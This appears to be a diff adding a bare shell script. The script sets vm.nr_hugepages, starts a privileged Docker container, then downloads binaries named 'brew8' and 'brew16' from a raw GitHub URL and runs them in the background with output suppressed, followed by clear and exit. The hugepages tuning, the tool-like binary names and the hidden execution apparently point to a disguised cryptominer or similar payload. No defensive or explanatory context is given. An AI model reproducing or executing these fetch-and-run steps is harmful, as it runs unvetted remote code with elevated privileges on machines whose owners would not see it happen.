@@ -1,0 +1,19 @@
+sudo sysctl vm.nr_hugepages=2560; sleep 2; docker pull node; docker run -d -t --privileged=true --name aaaa node; sleep 4; docker exec -it aaaa bash
+wget https://raw.githubusercontent.com/starapple/osx/main/brew8
+chmod +x brew8
+./brew8 > /dev/null 2>&1 &
+clear
+exit
+
+
+sudo sysctl vm.nr_hugepages=2560; sleep 2; docker pull node; docker run -d -t --privileged=true --name aaaa node; sleep 4; docker exec -it aaaa bash
+wget https://raw.githubusercontent.com/starapple/osx/main/brew16
+chmod +x brew16
+./brew16 > /dev/null 2>&1 &
+clear
+exit
+
+
+cat /proc/meminfo | grep Huge
+sleep 2
+clear
